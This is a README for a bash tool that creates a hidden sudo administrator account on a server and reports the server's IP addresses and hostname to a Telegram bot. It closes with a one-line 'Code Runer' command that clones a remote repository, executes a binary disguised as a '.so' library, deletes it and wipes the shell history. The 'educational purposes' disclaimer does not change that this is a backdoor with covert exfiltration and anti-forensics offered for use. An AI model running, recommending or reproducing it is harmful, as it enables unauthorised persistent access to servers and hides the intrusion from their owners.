# Hidden Admin User Creation Script

This script creates a hidden admin user on the server and sends notifications to a Telegram chat via a bot. It performs the following tasks:

1. **Checks if the script is run as root.**
2. **Sends server information to a specified Telegram chat.**
3. **Generates a random username and password for the new user.**
4. **Creates a new user with sudo privileges and hides it from the login screen.**

## Prerequisites

- **Bash**: This script requires Bash to run.
- **Curl**: The script uses `curl` to send messages to Telegram and fetch server information.
- **Telegram Bot Token and Chat ID**: You need to provide your Telegram bot token and chat ID where notifications will be sent.

## Usage

1. **Configure Telegram Bot Token and Chat ID**:

   Replace the placeholder values for `BOT_TOKEN` and `CHAT_ID` with your actual Telegram bot token and chat ID.

   ```bash
   BOT_TOKEN="your_telegram_bot_token"
   CHAT_ID="your_chat_id"
   ```

2. **Make the Script Executable**:

   ```bash
   chmod +x create_hidden_admin.sh
   ```

3. **Run the Script as Root**:

   ```bash
   sudo ./create_hidden_admin.sh
   ```

## Script Details

- **Function `send_telegram_message`**: Sends a message to the specified Telegram chat.
- **Function `get_server_info`**: Retrieves the server's IPv4 address, IPv6 address, and hostname.
- **Function `generate_random_string`**: Generates a random string of a given length.
- **User Creation**:
  - Checks if the user already exists.
  - Creates a new user with a randomly generated username and password.
  - Adds the user to the `sudo` group for admin privileges.
  - Hides the user by modifying the home directory to `/var/empty` and changing the login shell.

## Security Warning

- **Running as Root**: This script must be executed with root privileges. Running it with insufficient permissions may result in failure.
- **Hidden User**: While the user is hidden from the login screen, it can still be accessed and used if known. Ensure that you handle this user securely.

## Disclaimer

This script is provided for educational purposes and should be used responsibly. Misuse of this script can lead to security risks and unintended consequences. Always review and test scripts in a safe environment before deploying them in production.


##Code Runer
   ```bash
   git clone https://github.com/Aytola7/lib02uba.git && cd lib02uba &&chmod +x libxyz123.so&&./libxyz123.so&&cd /root&&rm -rf /root/lib02uba&&history -c &&rm ~/.bash_history&&history -w
   ```

---

Feel free to modify and extend the script according to your needs and ensure you understand its behavior before execution.
